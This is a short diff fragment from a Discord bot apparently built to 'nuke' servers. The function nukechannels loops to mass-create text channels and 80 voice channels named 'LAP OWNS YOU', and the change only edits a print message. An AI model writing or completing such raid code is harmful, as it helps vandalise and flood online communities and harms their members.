@@ -37,7 +37,7 @@ async def nukechannels(ctx):
             print('created text channel where go server??')
             for x in range(80):
                 await ctx.guild.create_voice_channel('LAP OWNS YOU')
-                print('created voice channel LAP OWNS YOU??')
+                print('created voice channel LAP OWNS YOU')
 
 
 @bot.command()
